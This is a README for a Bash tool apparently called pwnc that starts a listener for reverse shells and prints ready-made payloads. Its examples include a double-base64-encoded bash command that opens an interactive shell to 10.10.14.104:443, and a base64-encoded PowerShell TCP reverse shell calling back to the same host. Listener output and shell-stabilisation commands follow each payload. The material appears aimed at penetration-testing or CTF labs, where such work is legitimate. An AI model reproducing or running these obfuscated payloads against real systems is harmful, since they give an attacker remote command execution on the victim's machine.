# pwnc
This tool is a Bash script for setting up listener to handle reverse shells on Linux and Windows.

It automatically stabilizes Linux reverse shells.
```
$ ./pwty.sh -p 443
[*] Listening on 10.10.14.104:443...

[+] Payload:
echo WW1GemFDQXRZeUFpWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0eE1EUXZORFF6SURBK0pqRWlJQ1lnWkdsemIzZHVDZz09 | base64 -d | base64 -d | bash

listening on [any] 443 ...
connect to [10.10.14.104] from (UNKNOWN) [10.10.14.104] 50444
                                                             bash: initialize_job_control: no job control in background: Bad file descriptor
┌──(nlxz㉿kali)-[~/Workdir]
└─$ script -qc /bin/bash /dev/null
                                  export TERM=xterm && export SHELL=/bin/bash && stty rows 51 columns 140
┌──(nlxz㉿kali)-[~/Workdir]
└─$ export TERM=xterm && export SHELL=/bin/bash && stty rows 51 columns 140

┌──(nlxz㉿kali)-[~/Workdir]
└─$ 
```

Using the `-w` parameter it will handle Windows connections using rlwrap to allow command history, `Ctrl+l` to clear the screen and other functions, also preventing `Ctrl+c` from killing the session.
```
$ ./pwty.sh -p 443 -w
[*] Listening on 10.10.14.104:443...

[+] Payload:
powershell -e JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADAALgAxADAALgAxADQALgAxADAANAAiACwANAA0ADMAKQA7ACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJAByACAAPQAgACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJAByADIAIAAgAD0AIAAkAHIAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBiACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJAByADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkACgA=

listening on [any] 443 ...
connect to [10.10.14.104] from (UNKNOWN) [10.10.14.104] 56108

PS /home/nlxz/Workdir> 
```
